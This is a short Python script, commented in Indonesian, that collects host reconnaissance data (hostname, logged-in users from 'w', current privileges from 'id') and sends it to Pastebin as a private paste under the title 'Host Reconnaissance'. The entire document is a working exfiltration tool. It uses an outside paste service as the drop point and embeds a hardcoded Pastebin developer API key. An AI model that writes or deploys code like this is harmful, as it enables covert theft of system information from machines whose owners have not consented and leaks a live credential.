#!/usr/bin/env python3

import subprocess
import requests

API = "qvUm35xDlT0UXLDCYxUCZbuGBH77ZFKL"
PASTEBIN_URL = "https://pastebin.com/api/api_post.php"
PRIVATE = 1

PASTEBIN_TEXT = """	
"""
#mencari Hostname, User yang login, dan Current Privileges setelah itu di decode
hostname = subprocess.Popen("cat /proc/sys/kernel/hostname", stdout=subprocess.PIPE, shell=True).stdout.read().decode()
user_loggedin = subprocess.Popen("w", stdout=subprocess.PIPE, shell=True).stdout.read().decode()
user_privileges = subprocess.Popen("id", stdout=subprocess.PIPE, shell=True).stdout.read().decode()
#memasukan semua data
PASTEBIN_TEXT += "Hostname Agent: " + hostname
PASTEBIN_TEXT += "\nLogged In user:\n" + user_loggedin
PASTEBIN_TEXT += "\nUser Privileges: " + user_privileges
#memasukan judul
PASTENAME = "Host Reconnaissance " + hostname
#melakukan post semua data ke pastebin
response = requests.post(PASTEBIN_URL, data={"api_option":"paste", "api_paste_private":PRIVATE, "api_paste_name":PASTENAME, "api_paste_expire_date": "1D", "api_dev_key": API, "api_paste_code": PASTEBIN_TEXT})

print(response.text)
